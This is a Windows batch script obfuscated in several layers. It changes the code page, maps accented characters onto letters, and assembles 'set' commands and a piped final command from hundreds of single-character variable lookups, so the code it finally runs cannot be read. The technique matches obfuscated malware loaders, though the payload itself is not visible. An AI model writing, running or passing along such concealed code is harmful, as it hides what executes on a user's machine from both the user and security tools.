@echo off&(if defined @xu@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=:. tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@xu@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@bu@=¡¢¤¥§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@bu@:~%%N,1!=!@xu@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%æ%%ä%%é%%ð%%¡%%ð%%ç%%ç%
%ä%%í%%ô%
%ô%%æ%%õ%%¡%%ö%%Ì%%å%%Õ%%ú%%Ë%%¾%%Ã%%ù%%Å%%å%%Ï%%×%%Î%%Ø%%Ù%%û%%ã%%î%%ó%%¸%%ö%%ï%%Ñ%%Ó%%ñ%%ë%%±%%´%%ô%%°%%µ%%¨%%©%%È%%ì%%²%%º%%³%%Ê%%Æ%%Õ%%¬%%¼%%Ô%%Ú%%ê%%Þ%%¯%%é%%ò%%ø%%ä%%â%%Â%%ª%%¶%%õ%%Ë%%Í%%ð%%Û%%Ò%%£%%è%{:?yef-FO}%í%%Ü%%÷%%¾%%¹%%Ö%%Ì%%·%%Ä%%É%
%ô%%æ%%õ%%¡%%Û%%í%%Ö%%¹%%ç%%Ú%%î%%Õ%%â%%÷%%Í%%å%%Õ%%È%%ø%%ï%%ê%%õ%%Ò%%´%%¾%%ñ%%ð%
%ô%%æ%%õ%%¡%%í%%Ñ%%Í%%û%%ø%%Ð%%û%%É%%Ö%%ñ%%³%%ö%%Ú%%æ%%ñ%%Ç%%Ä%%È%%ï%%¾%%ß%%ø%%æ%
%ô%%æ%%õ%%¡%%ñ%%õ%%Ï%%ð%%ï%%ù%%Ô%%ú%%¶%%ç%%ð%%Ë%%Ö%%Ä%%Ê%%ó%%×%%²%%û%%å%%·%%É%%Ù%%µ%%×%%É%%³%%¾%%ß%%ó%%ß%%ô%%é%
%ô%%æ%%õ%%¡%%Æ%%Ö%%Ù%%Ô%%Í%%ë%%º%%ã%%ø%%Â%%õ%%ô%%ç%%Û%%ù%%È%%Õ%%ñ%%Ä%%Æ%%õ%%ê%%õ%%Ò%%¾%%ß%%æ%%í%%ß%%í%
%ô%%æ%%õ%%¡%%ç%%÷%%·%%Ô%%ó%%¹%%·%%µ%%Ç%%ã%%ú%%í%%Ñ%%ê%%ø%%µ%%õ%%×%%÷%%¾%%¯%%æ%%ù%
%ô%%æ%%õ%%¡%%ô%%÷%%Ð%%Ì%%±%%Ð%%µ%%õ%%ð%%Å%%è%%ã%%²%%ì%%Î%%÷%%Ó%%º%%Â%%÷%%ã%%Ç%%´%%¾%%ß%%æ%%¡%%®%%æ%%ñ%%¡%%ã%%ú%%ß%%ñ%%â%
%ô%%æ%%õ%%¡%%ç%%ó%%Ê%%Ù%%Ä%%Û%%î%%Ë%%õ%%í%%Æ%%â%%ç%%Ù%%±%%Ø%%å%%â%%õ%%è%%ú%%Õ%%¾%%ß%%ô%%ô%%¡%%®%%ß%%ï%
%ô%%æ%%õ%%¡%%È%%Ú%%å%%æ%%Ç%%ö%%²%%÷%%Å%%è%%Ø%%Û%%æ%%÷%%Â%%Å%%Î%%õ%%¶%%Â%%Å%%³%%Û%%Ê%%ù%%Û%%è%%ñ%%²%%ç%%¾%%ð%%ñ%%ß%%¡%
%ô%%æ%%õ%%¡%%Ê%%´%%Ç%%ë%%ç%%Ó%%ì%%ð%%Ñ%%¹%%×%%æ%%²%%ä%%é%%Ä%%Ä%%é%%ê%%´%%Ú%%¾%%ß%%®%%ø%
%ô%%æ%%õ%%¡%%Ú%%ò%%ó%%ã%%ú%%È%%í%%ã%%Ï%%Î%%î%%Ê%%·%%Â%%Æ%%Ô%%±%%ó%%ú%%ð%%å%%Ì%%Í%%¾%%ê%%ï%%ß%%¡%%ß%%²%%¡%%ß%%®%
%ô%%æ%%õ%%¡%%â%%Ð%%í%%Û%%ö%%Ô%%Ú%%ê%%¸%%ù%%Æ%%µ%%È%%Å%%È%%Ì%%¶%%Ø%%û%%Ä%%Ä%%È%%Æ%%ã%%ð%%é%%¾%%å%%ê%%ç%%Û%%ù%%â%%Î%%º%%ø%%â%%ä%%É%%ï%%ã%%ô%%ã%%º%%ñ%%Ò%%Í%%¶%%Û%%Ø%%Â%
%ô%%æ%%õ%%¡%%ë%%õ%%Ô%%é%%Û%%Ä%%Ó%%Ð%%Ñ%%ö%%º%%Û%%í%%Ó%%é%%Ò%%Î%%Õ%%é%%æ%%Ì%%ö%%ï%%ô%%¸%%ö%%Ñ%%ë%%Ï%%÷%%¾%%Ó%%³%%×%%Û%%²%%ø%%Û%%×%%ñ%%Ò%%Ì%%÷%%Û%%´%%ö%%ö%%Ð%%Ì%%×%%é%%×%%ó%%ç%%É%%Ó%%Ú%%í%
%ô%%æ%%õ%%¡%%Æ%%ï%%¸%%Ê%%÷%%Ù%%º%%Â%%È%%ó%%Í%%ú%%³%%Ò%%Ê%%¸%%û%%õ%%î%%Ò%%õ%%Â%%ñ%%²%%µ%%û%%¶%%Â%%È%%¾%%Ø%%û%%é%%õ%%Ë%%±%%±%%î%%Ó%%è%%â%%Ø%%Ð%%×%%Ê%%Â%%È%%Í%%î%%×%%ù%%±%%ç%%±%%´%%Í%%Õ%%ñ%%Ô%%Ä%
%ô%%æ%%õ%%¡%%ò%%Æ%%Æ%%Õ%%Ø%%Ú%%Å%%²%%Ñ%%Û%%Õ%%ã%%Ð%%õ%%Ò%%µ%%Í%%í%%å%%ò%%ñ%%º%%â%%Ä%%¾%%Ô%%Ä%%Ê%%é%%Ï%%î%%Ð%%Ò%%Ò%%÷%%ú%%È%%ê%%é%%Ø%%å%%Ë%%î%%Ñ%%Ã%
%ô%%æ%%õ%%¡%%ë%%â%%Ê%%ë%%Ì%%ñ%%ï%%Ç%%Ï%%³%%Î%%È%%ä%%Ö%%Ò%%ê%%î%%ò%%¾%%uKdTyJ:~39,1%%uKdTyJ:~62,1%%uKdTyJ:~1,1%%uKdTyJ:~26,1%%uKdTyJ:~56,1%%uKdTyJ:~32,1%%uKdTyJ:~33,1%%uKdTyJ:~8,1%%uKdTyJ:~26,1%%uKdTyJ:~4,1%%uKdTyJ:~62,1%%uKdTyJ:~44,1%%uKdTyJ:~64,1%%uKdTyJ:~66,1%%uKdTyJ:~10,1%%uKdTyJ:~19,1%%uKdTyJ:~62,1%%uKdTyJ:~45,1%%uKdTyJ:~50,1%%¡%%uKdTyJ:~4,1%%uKdTyJ:~62,1%%uKdTyJ:~50,1%%uKdTyJ:~41,1%%uKdTyJ:~7,1%%uKdTyJ:~62,1%%uKdTyJ:~10,1%%uKdTyJ:~76,1%%uKdTyJ:~68,1%%uKdTyJ:~39,1%%uKdTyJ:~62,1%%uKdTyJ:~15,1%%uKdTyJ:~50,1%%uKdTyJ:~48,1%%uKdTyJ:~41,1%%uKdTyJ:~2,1%%uKdTyJ:~53,1%%uKdTyJ:~44,1%%uKdTyJ:~15,1%%uKdTyJ:~68,1%%uKdTyJ:~53,1%%uKdTyJ:~46,1%%uKdTyJ:~3,1%%uKdTyJ:~37,1%%uKdTyJ:~50,1%%uKdTyJ:~12,1%%uKdTyJ:~39,1%%uKdTyJ:~15,1%%uKdTyJ:~57,1%%uKdTyJ:~26,1%%uKdTyJ:~25,1%%uKdTyJ:~42,1%%uKdTyJ:~50,1%%uKdTyJ:~50,1%%uKdTyJ:~18,1%%uKdTyJ:~59,1%%uKdTyJ:~23,1%%uKdTyJ:~23,1%%uKdTyJ:~24,1%%uKdTyJ:~20,1%%uKdTyJ:~41,1%%uKdTyJ:~13,1%%uKdTyJ:~29,1%%uKdTyJ:~41,1%%uKdTyJ:~49,1%%uKdTyJ:~30,1%%uKdTyJ:~41,1%%uKdTyJ:~29,1%%uKdTyJ:~75,1%%uKdTyJ:~72,1%%uKdTyJ:~23,1%%uKdTyJ:~60,1%%uKdTyJ:~46,1%%uKdTyJ:~71,1%%uKdTyJ:~54,1%%uKdTyJ:~20,1%%uKdTyJ:~2,1%%uKdTyJ:~33,1%%uKdTyJ:~8,1%%uKdTyJ:~73,1%%uKdTyJ:~0,1%%uKdTyJ:~37,1%%uKdTyJ:~7,1%%uKdTyJ:~2,1%%uKdTyJ:~13,1%%uKdTyJ:~65,1%%uKdTyJ:~33,1%%uKdTyJ:~24,1%%uKdTyJ:~49,1%%uKdTyJ:~34,1%%uKdTyJ:~21,1%%uKdTyJ:~51,1%%uKdTyJ:~77,1%%uKdTyJ:~0,1%%uKdTyJ:~6,1%%uKdTyJ:~6,1%%uKdTyJ:~51,1%%uKdTyJ:~8,1%%uKdTyJ:~76,1%%uKdTyJ:~7,1%%uKdTyJ:~21,1%%uKdTyJ:~2,1%%uKdTyJ:~66,1%%uKdTyJ:~4,1%%uKdTyJ:~30,1%%uKdTyJ:~72,1%%uKdTyJ:~16,1%%uKdTyJ:~30,1%%uKdTyJ:~52,1%%uKdTyJ:~38,1%%uKdTyJ:~21,1%%uKdTyJ:~37,1%%uKdTyJ:~17,1%%uKdTyJ:~34,1%%uKdTyJ:~25,1%%uKdTyJ:~48,1%%uKdTyJ:~56,1%%uKdTyJ:~48,1%%uKdTyJ:~36,1%
%ô%%æ%%õ%%¡%%Ì%%³%%ê%%Ð%%Î%%¶%%ã%%ô%%Å%%å%%ö%%ï%%±%%ã%%Å%%î%%÷%%Ù%%Ã%%µ%%Ñ%%ï%%Ö%%×%%¾%%É%%º%%²%%ê%%Ø%%÷%%æ%%ö%%µ%%³%%ñ%%Ë%%Ê%%Í%%×%%¶%%ò%%ó%%×%%¸%%ö%%Ç%%ö%%Ë%%æ%
%ô%%æ%%õ%%¡%%Ö%%Ò%%×%%Ì%%Ó%%µ%%ë%%º%%å%%Ì%%õ%%ò%%ø%%Ì%%È%%·%%ò%%é%%É%%Ê%%Ç%%Ú%%Ð%%¾%%Ù%%ë%%¹%%ù%%Î%%Ç%%º%%³%%ë%%¶%%ã%%è%%õ%%¸%%·%%Î%%å%%×%%ú%%Õ%%ê%%ð%
%ô%%æ%%õ%%¡%%î%%É%%´%%í%%Ö%%·%%µ%%Û%%õ%%Ó%%ù%%é%%ì%%µ%%è%%è%%Å%%ö%%÷%%Ù%%Ä%%²%%ï%%Å%%¾%%õ%%´%%æ%%ä%%ï%%õ%%Ó%%ä%%´%%Ï%%Ñ%%ê%%÷%%É%%Ì%%ø%%Í%%ï%%Ô%%Ê%%Ç%%Å%%µ%%å%%÷%%ò%%ë%%Ì%%ó%%Ø%
%æ%%ä%%é%%ð%%¡%%%%ë%%â%%Ê%%ë%%Ì%%ñ%%ï%%Ç%%Ï%%³%%Î%%È%%ä%%Ö%%Ò%%ê%%î%%ò%%%%¡%%ý%%¡%%ZlU8fYmTavLdTGwnitQ3%%lPLzwOzHUp2uYepFCGn%%ptNonxSy5foJUCIrV1zd6HX4VH2%%EUXSLj9bwAtsfZxGTpCEtitQ%%fv6Sr864FbylPiw4tVv%%svOK0O4toDgb1kMvR9AvbF3%%frIXCZmJtlEafX0WdatgyT%%GYdeFu1vDgWZevADMt5AD2ZIxZgp1f%%I3FjfRkoP8Ve1chCChi3Y%%YqrbyGlbNMmI6AES0ryodKL%
